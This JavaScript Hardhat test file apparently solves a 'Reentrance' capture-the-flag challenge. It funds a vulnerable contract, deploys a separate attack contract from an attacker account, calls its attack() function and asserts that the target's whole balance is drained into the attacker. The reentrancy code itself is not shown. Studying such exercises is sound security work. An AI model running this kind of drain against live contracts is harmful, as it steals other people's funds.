const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const CONTRACT_NAME = "Reentrance";
const CONTRACT_NAME_ATTACK = "ReentraceAttack";

describe(CONTRACT_NAME, function () {
  async function deployLoadFixture() {
    const [owner, attacker] = await ethers.getSigners();

    const Reentrancy = await ethers.getContractFactory(CONTRACT_NAME);
    const reentrancy = await Reentrancy.deploy();
    return { owner, attacker, reentrancy };
  }

  it("Challenge Solved", async function () {
    let tx;
    let { owner, attacker, reentrancy } = await loadFixture(deployLoadFixture);

    // init the balances
    tx = await reentrancy.donate(owner.address, { value: 10000 });
    await tx.wait();

    // deploy the attack contract
    const AttackContract = await ethers.getContractFactory(
      CONTRACT_NAME_ATTACK
    );
    let attackContract = await AttackContract.connect(attacker).deploy(
      reentrancy.address
    );
    await attackContract.deployed();

    // steal all the contract's balance
    attackContract = attackContract.connect(attacker);
    tx = await attackContract.attack({ value: 1000 });
    await tx.wait();

    // test
    const balance = await ethers.provider.getBalance(reentrancy.address);
    const attackBalance = await ethers.provider.getBalance(
      attackContract.address
    );
    expect(balance).to.equal(0);
    expect(attackBalance).to.equal(11000);
  });
});
